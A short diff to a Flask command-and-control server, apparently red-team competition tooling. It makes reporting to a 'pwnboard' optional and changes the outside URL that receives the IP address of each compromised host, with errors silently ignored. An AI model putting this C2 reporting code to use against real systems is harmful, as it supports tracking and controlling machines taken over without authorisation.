@@ -14,7 +14,7 @@ app = Flask(__name__)
 
 
 #Configuration dictionary
-config = {"upload_dir": "uploads", "show_requests": True,"debug":False}
+config = {"upload_dir": "uploads", "show_requests": True,"debug":False,"pwnboard":True,"pwnboard_url":"https://margs.salsas.bar/pwn/boxaccess"}
 
 # SQLite database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
@@ -69,11 +69,12 @@ def restrict_remote(func): # Decorator to restrict routes to localhost only
     return wrapper
 
 def update_pwnboard(ip):
-    try:
-        data = {'ip': ip, 'type': "skeletor"}
-        req = requests.post("https://pwnboard.win/pwn/boxaccess", json=data, timeout=3)
-    except:
-        pass
+    if config["pwnboard"]:
+        try:
+            data = {'ip': ip, 'type': "skeletor"}
+            req = requests.post(config["pwnboard_url"], json=data, timeout=3)
+        except:
+            pass
 
 def update_timestamp(agent_id):
     agent = Agent.query.filter_by(agent_id=agent_id).first()
